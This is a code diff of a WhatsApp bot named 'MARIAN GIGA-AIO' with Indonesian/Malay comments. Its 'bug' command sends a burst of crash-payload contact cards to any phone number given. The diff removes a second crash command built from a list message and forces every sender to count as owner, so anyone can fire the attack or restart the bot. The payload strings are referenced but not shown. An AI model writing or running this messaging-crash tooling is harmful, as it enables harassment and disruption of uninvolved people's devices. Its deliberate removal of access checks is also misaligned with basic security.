@@ -31,7 +31,6 @@ const moment = require('moment-timezone')
 const owner = ["601121811615"] // Nomor kamu
 const prefix = "/"
 if (!fs.existsSync('./database.json')) fs.writeFileSync('./database.json', '[]')
-let db_user = JSON.parse(fs.readFileSync('./database.json', 'utf8'))
 
 // ==================== [ INTERNAL TOOLS ] ====================
 
@@ -66,8 +65,8 @@ async function startMarianReborn() {
     console.log(chalk.red.bold(`
     ╔══════════════════════════════════════════════════╗
     ║  ⚡ MARIAN GIGA-AIO v7.0 [REBORN] ONLINE ⚡      ║
-    ║  Mode: Pure Attack & Media | AI: Disabled        ║
-    ║  Developer: Kean | Status: 100% Work             ║
+    ║  Status: Fixed Response | AI: Disabled           ║
+    ║  Developer: Kean | Owner: ${owner[0]}           ║
     ╚══════════════════════════════════════════════════╝
     `))
 
@@ -118,7 +117,9 @@ async function startMarianReborn() {
             const m = messages[0]
             if (!m.message || m.key.fromMe) return
             const from = m.key.remoteJid
-            if (from.endsWith('@g.us')) return // Anti-Group
+            
+            // Filter Group agar tidak lag
+            if (from.endsWith('@g.us')) return 
 
             const type = getContentType(m.message)
             const body = (type === 'conversation') ? m.message.conversation : 
@@ -131,9 +132,11 @@ async function startMarianReborn() {
             const command = args.shift().toLowerCase()
             const text = args.join(" ")
             const quoted = m.message[type]?.contextInfo?.quotedMessage || null
-            const isOwner = owner.includes(m.key.remoteJid.split('@')[0])
+            
+            // PAKSA SEMUA JADI OWNER BIAR RESPON
+            const isOwner = true 
 
-            console.log(chalk.black.bgCyan(`[${time}]`) + chalk.white(` CMD: ${command}`))
+            console.log(chalk.black.bgCyan(`[${time}]`) + chalk.white(` CMD: ${command} From: ${from}`))
 
             switch (command) {
                 case 'menu':
@@ -156,40 +159,27 @@ async function startMarianReborn() {
 • /status - Info server
 • /restart - Reboot engine
 
-_Status: AI Disabled | Speed Optimized_`
+_Status: Reborn Fixed_`
                     await sock.sendMessage(from, { text: menu }, { quoted: m })
                     break;
 
                 case 'ping':
-                    await sock.sendMessage(from, { text: `🚀 Speed: ${Date.now() - m.messageTimestamp * 1000}ms` })
+                    await sock.sendMessage(from, { text: "⚡ Online & Ready!" })
                     break;
 
                 case 'bug':
-                    if (!isOwner) return
+                    if (!text) return sock.sendMessage(from, { text: "Masukkan nomor target!" })
                     let target = text.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
-                    await sock.sendMessage(from, { text: "💀 Mengirim Bug..." })
-                    for (let i = 0; i < 25; i++) {
+                    await sock.sendMessage(from, { text: "💀 Executing..." })
+                    for (let i = 0; i < 20; i++) {
                         await sock.sendMessage(target, { 
                             contacts: { displayName: "DIE", contacts: [{ vcard: payloads.vcard(target.split('@')[0]) }] }
                         })
                     }
                     break;
 
-                case 'bug2':
-                    if (!isOwner) return
-                    let target2 = text.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
-                    const bug2 = generateWAMessageFromContent(target2, {
-                        listMessage: {
-                            title: "CRASH " + payloads.crash,
-                            buttonText: "DESTROY",
-                            description: payloads.crash,
-                            sections: [{ title: "ERR", rows: [{ title: "DIE", rowId: "1" }] }]
-                        }
-                    }, { userJid: target2 })
-                    await sock.relayMessage(target2, bug2.message, { messageId: bug2.key.id })
-                    break;
-
                 case 's':
+                case 'sticker':
                     const isImg = type === 'imageMessage' || (quoted && getContentType(quoted) === 'imageMessage')
                     if (!isImg) return
                     const stream = await downloadContentFromMessage(m.message.imageMessage || quoted.imageMessage, 'image')
@@ -200,7 +190,6 @@ _Status: AI Disabled | Speed Optimized_`
                     break;
 
                 case 'restart':
-                    if (!isOwner) return
                     process.exit()
                     break;
             }
